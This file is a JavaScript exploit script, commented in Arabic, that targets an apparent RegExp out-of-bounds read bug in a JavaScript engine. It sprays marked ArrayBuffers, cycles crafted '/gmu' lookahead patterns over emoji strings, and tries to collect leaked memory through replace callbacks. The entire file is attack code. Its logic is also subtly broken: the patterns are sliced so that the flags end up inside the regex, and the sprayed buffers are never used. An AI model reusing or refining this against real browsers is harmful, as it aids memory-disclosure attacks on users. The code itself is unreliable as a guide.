import { log, sleep } from './module/utils.mjs';

class RegExpOOBReadExploit {
    constructor() {
        this.marker = 0x42424242;
    }

    async execute() {
        await this.setupMemory();
        return await this.triggerOOBRead();
    }

    async setupMemory() {
        // تحضير الذاكرة للكشف عن OOB-read
        this.buffers = [];
        this.strings = [];
        
        // إنشاء ArrayBuffers مع markers
        for (let i = 0; i < 100; i++) {
            const buffer = new ArrayBuffer(0x1000);
            const view = new Uint32Array(buffer);
            view[0] = this.marker;
            view[1] = i;
            this.buffers.push(buffer);
        }
        
        // إنشاء strings مع non-BMP characters
        for (let i = 0; i < 50; i++) {
            const str = String.fromCodePoint(128512).repeat(10 + i);
            this.strings.push(str);
        }
        
        log("Memory setup complete");
    }

    async triggerOOBRead() {
        log("Triggering RegExp OOB-read...");
        
        const testCases = [
            // من الكود الأصلي
            "/(?!(?=^a|()+()+x)(abc))/gmu",
            "/(?!(?=^a|x)(abc))/gmu", 
            "/(?!(?=^a|x)(abc))/mu",
            
            // أنماط إضافية للتجريب
            "/(?=^)/gmu",
            "/(?=$)/gmu",
            "/^/gmu",
            "/$/gmu"
        ];
        
        for (const pattern of testCases) {
            log(`Testing pattern: ${pattern}`);
            
            try {
                const result = await this.testPattern(pattern);
                if (result.crashed || result.unexpected) {
                    log(`PATTERN CRASHED: ${pattern}`);
                    return true;
                }
            } catch (e) {
                log(`Pattern error: ${pattern} - ${e}`);
            }
            
            await sleep(10);
        }
        
        return false;
    }

    async testPattern(patternStr) {
        const regex = new RegExp(patternStr.slice(1, -1));
        const str = String.fromCodePoint(128512).repeat(20);
        
        let result;
        let crashed = false;
        let unexpected = false;
        
        try {
            result = str.replace(regex, (match) => {
                // إذا حدث OOB-read، قد نرى بيانات غير متوقعة
                if (match.length > 1000) {
                    unexpected = true;
                    log(`SUSPICIOUS match length: ${match.length}`);
                }
                return '|';
            });
            
            // تحقق من النتيجة
            if (result.length !== str.length + 1) {
                log(`UNEXPECTED result length: ${result.length}`);
                unexpected = true;
            }
            
        } catch (e) {
            crashed = true;
            log(`CRASH with pattern: ${e}`);
        }
        
        return { crashed, unexpected, result };
    }

    // محاولة لاستغلال OOB-read للحصول على معلومات الذاكرة
    async exploitMemoryLeak() {
        log("Attempting memory leak via OOB-read...");
        
        const leakedData = [];
        
        for (let i = 0; i < 10; i++) {
            const str = this.createSpeciallyCraftedString(i);
            const regex = /(?!(?=^a|()+()+x)(abc))/gmu;
            
            try {
                const result = str.replace(regex, (match, offset, fullStr) => {
                    // إذا كان هناك OOB-read، قد نرى بيانات من الذاكرة المجاورة
                    if (match.length > 2) {
                        leakedData.push({
                            iteration: i,
                            match: match,
                            length: match.length,
                            offset: offset
                        });
                    }
                    return '|';
                });
                
                if (leakedData.length > 0) {
                    log(`Found ${leakedData.length} potential leaks`);
                    return leakedData;
                }
                
            } catch (e) {
                log(`Leak attempt ${i} crashed: ${e}`);
            }
            
            await sleep(5);
        }
        
        return null;
    }

    createSpeciallyCraftedString(iteration) {
        // إنشاء string مصمم خصيصاً لاستغلال الثغرة
        const base = String.fromCodePoint(128512 + iteration);
        const padding = "A".repeat(iteration * 10);
        return padding + base.repeat(15) + padding;
    }
}

// التشغيل الرئيسي
async function main() {
    const exploit = new RegExpOOBReadExploit();
    
    log("Starting RegExp OOB-read exploit...");
    
    const triggered = await exploit.execute();
    if (triggered) {
        log("OOB-read likely triggered! Attempting exploitation...");
        
        const leaks = await exploit.exploitMemoryLeak();
        if (leaks) {
            log("Potential memory leaks found:");
            for (const leak of leaks) {
                log(`  Iteration ${leak.iteration}: length=${leak.length}, offset=${leak.offset}`);
            }
        }
    } else {
        log("No OOB-read detected with standard patterns");
    }
}

main();